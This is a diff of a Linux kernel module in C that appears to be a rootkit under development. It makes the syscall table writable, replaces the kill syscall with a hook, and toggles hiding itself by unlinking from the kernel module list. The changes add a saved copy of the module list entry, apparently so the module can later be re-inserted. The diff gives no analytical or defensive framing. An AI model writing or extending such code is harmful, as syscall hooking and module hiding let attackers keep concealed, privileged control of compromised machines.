@@ -15,6 +15,7 @@ int m_num=0;
 void ** sctable ;
 bool hiding = false;
 struct module *current_mod;
+struct list_head modules;
 
 asmlinkage int (*orig_sys_kill)(pid_t pid, int signal) ;
 asmlinkage int m_sys_kill(pid_t pid, int signal) {
@@ -68,7 +69,6 @@ ssize_t m_write(struct file *file, const char __user *ubuf, size_t size, loff_t 
 	
 	if(m_temp[0]=='o') { //on , off
         hiding = !hiding;
-//        struct module *mod = find_module("mexe");
         
         if(hiding) {
             list_del_init(&current_mod->list);
@@ -113,13 +113,13 @@ int __init m_init(void) {
 		pte->pte |= _PAGE_RW;
 	sctable[__NR_kill] = m_sys_kill;
 
-    current_mod = &__this_module;
+   	 current_mod = &__this_module;
 	/* hiding */
 	
 //    struct module *m = &__this_module;
 //    if(m->init == m_init)
 //        list_del_init(&m->list);
-	
+	modules = THIS_MODULE->list;
 	/*  */
 
 	return 0;
